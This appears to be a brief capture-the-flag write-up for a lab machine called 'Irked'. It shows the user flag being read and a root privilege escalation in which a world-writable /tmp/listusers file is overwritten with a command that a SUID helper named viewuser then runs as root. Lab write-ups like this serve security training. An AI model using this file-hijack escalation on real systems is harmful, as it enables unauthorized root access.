# user flag
```
djmardov@irked:~$ cat user.txt 
be<SNIP>de7
```

# root flag
```
djmardov@irked:~$ chmod 777 /tmp/listusers 
djmardov@irked:~$ echo 'cat /root/root.txt' > /tmp/listusers
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-09-13 13:02 (:0)
djmardov pts/0        2025-09-13 13:12 (10.10.14.9)
ea<SNIP>fb
```